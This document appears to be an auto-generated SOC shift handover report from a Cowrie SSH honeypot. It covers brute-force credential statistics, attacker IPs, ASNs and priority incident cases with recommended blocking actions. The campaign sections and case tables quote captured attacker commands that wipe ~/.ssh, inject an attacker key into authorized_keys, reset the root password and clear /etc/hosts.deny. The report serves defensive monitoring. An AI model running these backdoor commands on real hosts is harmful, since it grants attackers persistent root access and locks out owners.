# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T19:23:18Z |
| **Shift Time** | 19:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **315** |
| Confirmed Threats | **310** |
| False Positives Filtered | **5** (1.6%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **11** |
| High Severity Cases | **147** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **168** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **281** |
| Unique Credential Pairs | **113** |
| Unique Usernames | **29** |
| Unique Passwords | **112** |
| Successful Auth Pairs | **82** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 147 |
| `345gs5662d34` | 72 |
| `ubuntu` | 12 |
| `postgres` | 6 |
| `steam` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 72 |
| `345gs5662d34` | 72 |
| `ZZxx123` | 3 |
| `123456` | 2 |
| `010101` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 72 |
| `345gs5662d34` | `345gs5662d34` | 72 |
| `root` | `ZZxx123` | 3 |
| `liyang` | `123456` | 2 |
| `ubuntu` | `010101` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1Qaz2wsx` | `171.220.244.134` | 2026-04-14T17:21:03 |
| `root` | `Root001@123` | `171.220.244.134` | 2026-04-14T17:22:20 |
| `root` | `ZZxx123` | `78.89.154.59` | 2026-04-14T17:22:28 |
| `root` | `3245gs5662d34` | `171.220.244.134` | 2026-04-14T17:22:28 |
| `root` | `tencent@2025` | `103.146.159.14` | 2026-04-14T17:22:59 |
| `root` | `3245gs5662d34` | `103.146.159.14` | 2026-04-14T17:23:02 |
| `root` | `Qazwsx123456!!` | `38.19.156.18` | 2026-04-14T17:23:04 |
| `root` | `3245gs5662d34` | `38.19.156.18` | 2026-04-14T17:23:11 |
| `root` | `root1111111@@` | `103.23.198.86` | 2026-04-14T17:24:25 |
| `root` | `3245gs5662d34` | `103.23.198.86` | 2026-04-14T17:24:31 |
| `root` | `qazwsx123456!!` | `118.193.33.228` | 2026-04-14T17:24:45 |
| `root` | `3245gs5662d34` | `118.193.33.228` | 2026-04-14T17:24:48 |
| `root` | `root1111111@@` | `38.19.156.18` | 2026-04-14T17:24:51 |
| `root` | `qwertqwert123456` | `162.19.243.145` | 2026-04-14T17:25:27 |
| `root` | `3245gs5662d34` | `162.19.243.145` | 2026-04-14T17:25:30 |
| `root` | `Root10` | `118.193.33.228` | 2026-04-14T17:26:20 |
| `root` | `Root12345@` | `103.146.159.14` | 2026-04-14T17:26:23 |
| `root` | `!@#qwe123` | `38.19.156.18` | 2026-04-14T17:26:40 |
| `root` | `Qazwsx123123@` | `171.220.244.134` | 2026-04-14T17:27:46 |
| `root` | `Dm123456` | `118.193.33.228` | 2026-04-14T17:27:55 |
| `root` | `1q2w3e4r5tA` | `103.146.159.14` | 2026-04-14T17:28:04 |
| `root` | `QA2ws3ed!` | `38.19.156.18` | 2026-04-14T17:28:27 |
| `root` | `QA2ws3ed!` | `103.23.198.86` | 2026-04-14T17:29:19 |
| `root` | `Changeme123!` | `118.193.33.228` | 2026-04-14T17:29:26 |
| `root` | `Letmein123!` | `103.146.159.14` | 2026-04-14T17:29:40 |
| `root` | `changeme123` | `38.19.156.18` | 2026-04-14T17:30:09 |
| `root` | `12345678Qq` | `103.146.159.14` | 2026-04-14T17:31:14 |
| `root` | `root0000#$` | `103.23.198.86` | 2026-04-14T17:31:44 |
| `root` | `Ms123456` | `118.193.33.228` | 2026-04-14T17:32:25 |
| `root` | `qazwsx6666..` | `38.19.156.18` | 2026-04-14T17:33:29 |
| `root` | `Aa654321` | `103.146.159.14` | 2026-04-14T17:34:30 |
| `root` | `Root4321` | `171.220.244.134` | 2026-04-14T17:34:38 |
| `root` | `Server2026#` | `43.163.127.183` | 2026-04-14T17:34:40 |
| `root` | `3245gs5662d34` | `43.163.127.183` | 2026-04-14T17:34:42 |
| `root` | `bbQQ1234` | `43.163.127.183` | 2026-04-14T17:36:20 |
| `root` | `changeme123` | `103.23.198.86` | 2026-04-14T17:36:39 |
| `root` | `CCcc112233` | `118.193.33.228` | 2026-04-14T17:37:18 |
| `root` | `root0000#$` | `38.19.156.18` | 2026-04-14T17:38:45 |
| `root` | `Lt12345678` | `118.193.33.228` | 2026-04-14T17:38:57 |
| `root` | `promo123` | `103.146.159.14` | 2026-04-14T17:39:39 |
| `root` | `www123456` | `43.163.127.183` | 2026-04-14T17:39:43 |
| `root` | `Huawei@12345` | `118.193.33.228` | 2026-04-14T17:40:39 |
| `root` | `admin.123` | `43.163.127.183` | 2026-04-14T17:41:28 |
| `root` | `1123581321` | `103.23.198.86` | 2026-04-14T17:41:34 |
| `root` | `1123581321` | `38.19.156.18` | 2026-04-14T17:42:23 |
| `root` | `XXaa111` | `103.146.159.14` | 2026-04-14T17:42:59 |
| `root` | `qazwsx1111111@` | `103.23.198.86` | 2026-04-14T17:44:01 |
| `root` | `root9999!@` | `38.19.156.18` | 2026-04-14T17:44:03 |
| `root` | `root8888@` | `103.146.159.14` | 2026-04-14T17:44:34 |
| `root` | `zxcZXC123!@#` | `43.163.127.183` | 2026-04-14T17:44:58 |
| `root` | `13579` | `38.19.156.18` | 2026-04-14T17:45:46 |
| `root` | `QWE@1234` | `103.146.159.14` | 2026-04-14T17:46:14 |
| `root` | `root9999!@` | `103.23.198.86` | 2026-04-14T17:46:28 |
| `root` | `456654` | `43.163.127.183` | 2026-04-14T17:46:46 |
| `root` | `Root1!@` | `38.19.156.18` | 2026-04-14T17:47:29 |
| `root` | `1qazxcvbnm,./` | `118.193.33.228` | 2026-04-14T17:48:19 |
| `root` | `root6666$` | `43.163.127.183` | 2026-04-14T17:48:32 |
| `root` | `r00t@` | `103.23.198.86` | 2026-04-14T17:48:57 |
| `root` | `ZZxx123` | `38.19.156.18` | 2026-04-14T17:49:11 |
| `root` | `Qazwsx001@@` | `118.193.33.228` | 2026-04-14T17:49:51 |
| `root` | `Qazwsx112233#$` | `43.163.127.183` | 2026-04-14T17:50:13 |
| `root` | `zhang123456` | `38.19.156.18` | 2026-04-14T17:50:57 |
| `root` | `a12345678915` | `103.146.159.14` | 2026-04-14T17:51:12 |
| `root` | `Root6666!@` | `118.193.33.228` | 2026-04-14T17:51:30 |
| `root` | `qazwsx1111111@` | `38.19.156.18` | 2026-04-14T17:52:47 |
| `root` | `Qazwsx123456!!` | `103.23.198.86` | 2026-04-14T17:53:53 |
| `root` | `Asdasd123` | `118.193.33.228` | 2026-04-14T17:54:55 |
| `root` | `P@ssword12345@` | `43.163.127.183` | 2026-04-14T17:57:04 |
| `root` | `Qazwsx999!@#` | `118.193.33.228` | 2026-04-14T17:58:03 |
| `root` | `Root2022@123` | `103.23.198.86` | 2026-04-14T17:58:46 |
| `root` | `root12345!` | `118.193.33.228` | 2026-04-14T17:59:39 |
| `root` | `123456@w` | `103.146.159.14` | 2026-04-14T18:01:13 |
| `root` | `r00t@` | `38.19.156.18` | 2026-04-14T18:01:36 |
| `root` | `qwerasdf` | `43.163.127.183` | 2026-04-14T18:02:21 |
| `root` | `Root2022@123` | `38.19.156.18` | 2026-04-14T18:03:17 |
| `root` | `zhang123456` | `103.23.198.86` | 2026-04-14T18:03:40 |
| `root` | `ZZxx123` | `103.23.198.86` | 2026-04-14T18:06:11 |
| `root` | `1qaz@WSX3edc$RFV$` | `43.163.127.183` | 2026-04-14T18:07:35 |
| `root` | `!@#qwe123` | `103.23.198.86` | 2026-04-14T18:08:44 |
| `root` | `Root1!@` | `103.23.198.86` | 2026-04-14T18:11:11 |
| `root` | `13579` | `103.23.198.86` | 2026-04-14T18:13:41 |
| `root` | `qazwsx6666..` | `103.23.198.86` | 2026-04-14T18:16:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **315** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 308 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 307 | 13 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 307 | 13 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 72 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Ss7dYpOagftA"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `171.220.244.134`, `78.89.154.59`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.23.198.86`, `171.220.244.134`, `103.146.159.14`, `38.19.156.18`, `162.19.243.145`, `43.163.127.183`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **19** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS38283` | CHINANET SiChuan Telecom Internet Data Center | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | MEDIUM |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (147)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6950fce7d487

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-14 17:21 |
| **Last Seen** | 2026-04-14 17:21 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Ss7dYpOagftA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:21:02` | `cowrie.session.connect` |
| `2026-04-14 17:21:02` | `cowrie.client.version` |
| `2026-04-14 17:21:02` | `cowrie.client.kex` |
| `2026-04-14 17:21:03` | `cowrie.login.success` |
| `2026-04-14 17:21:03` | `cowrie.session.params` |
| `2026-04-14 17:21:03` | `cowrie.command.input` |
| `2026-04-14 17:21:03` | `cowrie.command.failed` |
| `2026-04-14 17:21:03` | `cowrie.log.closed` |
| `2026-04-14 17:21:04` | `cowrie.session.params` |
| `2026-04-14 17:21:04` | `cowrie.command.input` |
| `2026-04-14 17:21:04` | `cowrie.session.file_download` |
| `2026-04-14 17:21:04` | `cowrie.log.closed` |
| `2026-04-14 17:21:16` | `cowrie.session.params` |
| `2026-04-14 17:21:16` | `cowrie.command.input` |
| `2026-04-14 17:21:16` | `cowrie.log.closed` |
| `2026-04-14 17:21:17` | `cowrie.session.params` |
| `2026-04-14 17:21:17` | `cowrie.command.input` |
| `2026-04-14 17:21:17` | `cowrie.log.closed` |
| `2026-04-14 17:21:17` | `cowrie.session.params` |
| `2026-04-14 17:21:17` | `cowrie.command.input` |
| `2026-04-14 17:21:18` | `cowrie.session.file_download` |
| `2026-04-14 17:21:18` | `cowrie.log.closed` |
| `2026-04-14 17:21:18` | `cowrie.session.params` |
| `2026-04-14 17:21:18` | `cowrie.command.input` |
| `2026-04-14 17:21:18` | `cowrie.log.closed` |
| `2026-04-14 17:21:19` | `cowrie.session.params` |
| `2026-04-14 17:21:19` | `cowrie.command.input` |
| `2026-04-14 17:21:19` | `cowrie.log.closed` |
| `2026-04-14 17:21:19` | `cowrie.session.params` |
| `2026-04-14 17:21:19` | `cowrie.command.input` |
| `2026-04-14 17:21:19` | `cowrie.command.input` |
| `2026-04-14 17:21:19` | `cowrie.log.closed` |
| `2026-04-14 17:21:20` | `cowrie.session.params` |
| `2026-04-14 17:21:20` | `cowrie.command.input` |
| `2026-04-14 17:21:20` | `cowrie.log.closed` |
| `2026-04-14 17:21:20` | `cowrie.session.params` |
| `2026-04-14 17:21:20` | `cowrie.command.input` |
| `2026-04-14 17:21:20` | `cowrie.log.closed` |
| `2026-04-14 17:21:21` | `cowrie.session.params` |
| `2026-04-14 17:21:21` | `cowrie.command.input` |
| `2026-04-14 17:21:21` | `cowrie.log.closed` |
| `2026-04-14 17:21:21` | `cowrie.session.params` |
| `2026-04-14 17:21:21` | `cowrie.command.input` |
| `2026-04-14 17:21:22` | `cowrie.log.closed` |
| `2026-04-14 17:21:22` | `cowrie.session.params` |
| `2026-04-14 17:21:22` | `cowrie.command.input` |
| `2026-04-14 17:21:22` | `cowrie.log.closed` |
| `2026-04-14 17:21:23` | `cowrie.session.params` |
| `2026-04-14 17:21:23` | `cowrie.command.input` |
| `2026-04-14 17:21:23` | `cowrie.log.closed` |
| `2026-04-14 17:21:23` | `cowrie.session.params` |
| `2026-04-14 17:21:23` | `cowrie.command.input` |
| `2026-04-14 17:21:23` | `cowrie.log.closed` |
| `2026-04-14 17:21:24` | `cowrie.session.params` |
| `2026-04-14 17:21:24` | `cowrie.command.input` |
| `2026-04-14 17:21:24` | `cowrie.log.closed` |
| `2026-04-14 17:21:24` | `cowrie.session.params` |
| `2026-04-14 17:21:24` | `cowrie.command.input` |
| `2026-04-14 17:21:24` | `cowrie.log.closed` |
| `2026-04-14 17:21:25` | `cowrie.session.params` |
| `2026-04-14 17:21:25` | `cowrie.command.input` |
| `2026-04-14 17:21:25` | `cowrie.log.closed` |
| `2026-04-14 17:21:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4973e50ed05

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-14 17:22 |
| **Last Seen** | 2026-04-14 17:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:22:19` | `cowrie.session.connect` |
| `2026-04-14 17:22:19` | `cowrie.client.version` |
| `2026-04-14 17:22:19` | `cowrie.client.kex` |
| `2026-04-14 17:22:20` | `cowrie.login.success` |
| `2026-04-14 17:22:21` | `cowrie.session.params` |
| `2026-04-14 17:22:21` | `cowrie.command.input` |
| `2026-04-14 17:22:21` | `cowrie.command.failed` |
| `2026-04-14 17:22:21` | `cowrie.log.closed` |
| `2026-04-14 17:22:21` | `cowrie.session.params` |
| `2026-04-14 17:22:21` | `cowrie.command.input` |
| `2026-04-14 17:22:21` | `cowrie.session.file_download` |
| `2026-04-14 17:22:21` | `cowrie.log.closed` |
| `2026-04-14 17:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c11c61b00427

| Field | Detail |
|---|---|
| **Source IP** | `78.89.154[.]59` |
| **First Seen** | 2026-04-14 17:22 |
| **Last Seen** | 2026-04-14 17:22 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:nug9nFHoVaq5"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:22:27` | `cowrie.session.connect` |
| `2026-04-14 17:22:27` | `cowrie.client.version` |
| `2026-04-14 17:22:27` | `cowrie.client.kex` |
| `2026-04-14 17:22:28` | `cowrie.login.success` |
| `2026-04-14 17:22:29` | `cowrie.session.params` |
| `2026-04-14 17:22:29` | `cowrie.command.input` |
| `2026-04-14 17:22:29` | `cowrie.command.failed` |
| `2026-04-14 17:22:29` | `cowrie.log.closed` |
| `2026-04-14 17:22:29` | `cowrie.session.params` |
| `2026-04-14 17:22:29` | `cowrie.command.input` |
| `2026-04-14 17:22:29` | `cowrie.session.file_download` |
| `2026-04-14 17:22:29` | `cowrie.log.closed` |
| `2026-04-14 17:22:41` | `cowrie.session.params` |
| `2026-04-14 17:22:41` | `cowrie.command.input` |
| `2026-04-14 17:22:42` | `cowrie.log.closed` |
| `2026-04-14 17:22:42` | `cowrie.session.params` |
| `2026-04-14 17:22:42` | `cowrie.command.input` |
| `2026-04-14 17:22:42` | `cowrie.log.closed` |
| `2026-04-14 17:22:43` | `cowrie.session.params` |
| `2026-04-14 17:22:43` | `cowrie.command.input` |
| `2026-04-14 17:22:43` | `cowrie.session.file_download` |
| `2026-04-14 17:22:43` | `cowrie.log.closed` |
| `2026-04-14 17:22:43` | `cowrie.session.params` |
| `2026-04-14 17:22:43` | `cowrie.command.input` |
| `2026-04-14 17:22:43` | `cowrie.log.closed` |
| `2026-04-14 17:22:44` | `cowrie.session.params` |
| `2026-04-14 17:22:44` | `cowrie.command.input` |
| `2026-04-14 17:22:44` | `cowrie.log.closed` |
| `2026-04-14 17:22:45` | `cowrie.session.params` |
| `2026-04-14 17:22:45` | `cowrie.command.input` |
| `2026-04-14 17:22:45` | `cowrie.command.input` |
| `2026-04-14 17:22:46` | `cowrie.log.closed` |
| `2026-04-14 17:22:46` | `cowrie.session.params` |
| `2026-04-14 17:22:46` | `cowrie.command.input` |
| `2026-04-14 17:22:47` | `cowrie.log.closed` |
| `2026-04-14 17:22:47` | `cowrie.session.params` |
| `2026-04-14 17:22:47` | `cowrie.command.input` |
| `2026-04-14 17:22:47` | `cowrie.log.closed` |
| `2026-04-14 17:22:48` | `cowrie.session.params` |
| `2026-04-14 17:22:48` | `cowrie.command.input` |
| `2026-04-14 17:22:48` | `cowrie.log.closed` |
| `2026-04-14 17:22:48` | `cowrie.session.params` |
| `2026-04-14 17:22:48` | `cowrie.command.input` |
| `2026-04-14 17:22:48` | `cowrie.log.closed` |
| `2026-04-14 17:22:49` | `cowrie.session.params` |
| `2026-04-14 17:22:49` | `cowrie.command.input` |
| `2026-04-14 17:22:50` | `cowrie.log.closed` |
| `2026-04-14 17:22:50` | `cowrie.session.params` |
| `2026-04-14 17:22:50` | `cowrie.command.input` |
| `2026-04-14 17:22:50` | `cowrie.log.closed` |
| `2026-04-14 17:22:50` | `cowrie.session.params` |
| `2026-04-14 17:22:50` | `cowrie.command.input` |
| `2026-04-14 17:22:51` | `cowrie.log.closed` |
| `2026-04-14 17:22:51` | `cowrie.session.params` |
| `2026-04-14 17:22:51` | `cowrie.command.input` |
| `2026-04-14 17:22:51` | `cowrie.log.closed` |
| `2026-04-14 17:22:52` | `cowrie.session.params` |
| `2026-04-14 17:22:52` | `cowrie.command.input` |
| `2026-04-14 17:22:52` | `cowrie.log.closed` |
| `2026-04-14 17:22:53` | `cowrie.session.params` |
| `2026-04-14 17:22:53` | `cowrie.command.input` |
| `2026-04-14 17:22:54` | `cowrie.log.closed` |
| `2026-04-14 17:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.89.154[.]59` to AbuseIPDB if not already reported
- [ ] Block `78.89.154[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8a3d6ae40d

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-14 17:22 |
| **Last Seen** | 2026-04-14 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:22:27` | `cowrie.session.connect` |
| `2026-04-14 17:22:27` | `cowrie.client.version` |
| `2026-04-14 17:22:28` | `cowrie.client.kex` |
| `2026-04-14 17:22:28` | `cowrie.login.success` |
| `2026-04-14 17:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25229c9c27d3

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:22 |
| **Last Seen** | 2026-04-14 17:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
